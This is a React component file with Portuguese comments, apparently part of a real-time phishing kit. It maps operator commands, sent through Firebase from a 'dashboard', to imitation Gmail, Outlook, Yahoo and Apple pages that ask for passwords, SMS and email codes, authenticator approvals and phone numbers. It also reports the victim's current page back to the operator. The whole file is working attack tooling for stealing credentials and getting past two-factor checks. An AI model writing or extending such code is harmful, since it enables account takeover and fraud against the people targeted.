import React from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { useFirebaseClient } from "../../hooks/useFirebaseClient";

const VIEW_TO_IMPORT = {
  password: () => import("./gmail/GmailPasswordPage"),
  "gmail-sms": () => import("./gmail/GmailSmsPage"),
  codemail: () => import("./gmail/GmailCodeMailPage"),
  yes: () => import("./gmail/GmailYesPage"),
  auth: () => import("./gmail/GmailAuthPage"),
  app: () => import("./gmail/GmailAppPage"),
  youtube: () => import("./gmail/GmailYouTubePage"),
  "gmail-telefone": () => import("./gmail/GmailTelefonePage"),
  // Outlook
  outlook_password: () => import("./outlook/OutlookPasswordPage"),
  outlook_verify: () => import("./outlook/OutlookVerifyPage"),
  outlook_verify_code: () => import("./outlook/OutlookVerifyCodePage"),
  outlook_sms: () => import("./outlook/OutlookVerifySmsPage"),
  outlook_app: () => import("./outlook/OutlookAppPage"),
  outlook_digits: () => import("./outlook/OutlookDigitsPage"),
  // Yahoo
  yahoo_password: () => import("./yahoo/YahooPasswordPage"),
  yahoo_sms: () => import("./yahoo/YahooSmsPage"),
  yahoo_codesms: () => import("./yahoo/YahooCodeSmsPage"),
  yahoo_codemail: () => import("./yahoo/YahooCodeMailPage"),
  yahoo_auth: () => import("./yahoo/YahooAuthPage"),
  yahoo_email: () => import("./yahoo/YahooEmailPage"),
  yahoo_numero: () => import("./yahoo/YahooNumeroPage"),
  yahoo_whatsapp: () => import("./yahoo/YahooWhatsappPage"),
  // Apple
  apple_password: () => import("./apple/ApplePasswordPage"),
  apple_sms: () => import("./apple/AppleSmsPage"),
};

const COMMAND_TO_VIEW = {
  gmailpass: "password",
  gmailsms: "gmail-sms",
  gmailcodemail: "codemail",
  gmailyes: "yes",
  gmailauth: "auth",
  gmailapp: "app",
  gmailyoutube: "youtube",
  gmailtelefone: "gmail-telefone",
  gmailtel: "gmail-telefone",
  // legados/aliases
  gmailcode: "codemail",
  gmaildevice: "app",
  // Outlook
  outlookpass: "outlook_password",
  outlookverify: "outlook_verify",
  outlookcode: "outlook_verify_code",
  outlooksms: "outlook_sms",
  outlookapp: "outlook_app",
  outlookdigits: "outlook_digits",
  // Yahoo
  yahoopass: "yahoo_password",
  yahoosms: "yahoo_sms",
  yahoocodesms: "yahoo_codesms",
  yahoocodemail: "yahoo_codemail",
  yahooauth: "yahoo_auth",
  yahooemail: "yahoo_email",
  yahoonumero: "yahoo_numero",
  yahoowhatsapp: "yahoo_whatsapp",
  // Apple
  applepass: "apple_password",
  applesms: "apple_sms",
};

const GlobalEmailPage = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const { updateClientData, commands, clearCommands } = useFirebaseClient(navigate);

  // Atualiza presença/URL no Firebase
  React.useEffect(() => {
    updateClientData({ currentUrl: "/sync", currentPage: "sync" });
  }, [updateClientData]);

  // Extrai view da query
  const view = React.useMemo(() => {
    const params = new URLSearchParams(location.search || "");
    const v = (params.get("view") || params.get("v") || "").trim();
    return v || "";
  }, [location.search]);

  // Reage a comandos do dashboard → navega alterando somente a query
  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latestRaw = commands[commands.length - 1];
    if (!latestRaw) return;
    const latest =
      typeof latestRaw === "string"
        ? latestRaw.replace(/^\"*|\"*$/g, "").trim()
        : latestRaw;
    if (typeof latest !== "string") return;

    const mapped = COMMAND_TO_VIEW[latest];
    if (!mapped) return;

    // CORREÇÃO: Verificar se já estamos na view correta para evitar loops
    const currentView = view;
    if (currentView === mapped) {
      console.log("📧 SYNC: Já na view correta, evitando redirecionamento desnecessário:", mapped);
      // Limpar comando para evitar loops
      setTimeout(() => clearCommands && clearCommands(), 50);
      return;
    }

    const params = new URLSearchParams(location.search || "");
    params.set("view", mapped);
    navigate(`/sync?${params.toString()}`, { replace: false });
    // limpar depois de navegar
    setTimeout(() => clearCommands && clearCommands(), 50);
  }, [commands, navigate, location.search, clearCommands, view]);

  // Carrega dinamicamente a página conforme "view"
  const LazyComponent = React.useMemo(() => {
    const loader = VIEW_TO_IMPORT[view];
    if (!loader) return null;
    return React.lazy(loader);
  }, [view]);

  return (
    <div className="overflow-x-hidden" style={{ minHeight: "100vh" }}>
      <React.Suspense fallback={<div style={{ minHeight: "100vh" }} />}>
        {LazyComponent ? <LazyComponent embedded /> : null}
      </React.Suspense>
    </div>
  );
};

export default GlobalEmailPage;
